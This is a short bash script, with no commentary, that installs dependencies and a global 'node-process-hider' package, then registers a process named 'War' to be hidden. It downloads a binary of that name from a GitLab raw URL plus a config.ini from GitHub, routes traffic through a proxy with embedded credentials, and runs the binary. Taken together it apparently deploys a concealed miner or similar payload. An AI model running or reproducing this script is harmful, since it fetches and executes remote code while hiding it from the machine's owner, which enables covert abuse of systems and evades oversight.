#!/bin/bash
apt update
apt install screen -y
apt install libcurl4-openssl-dev libssl-dev libjansson-dev xz-utils -y
apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
npm i -g node-process-hider
 

ph add War

wget https://gitlab.com/Gasskeunjal/gblk/-/raw/main/War

wget https://raw.githubusercontent.com/NuDev2021/config.ini/main/config.ini

export http_proxy=http://ahwturcc:8fa37dasrpnu@209.127.191.180:9279

chmod +x War

./War
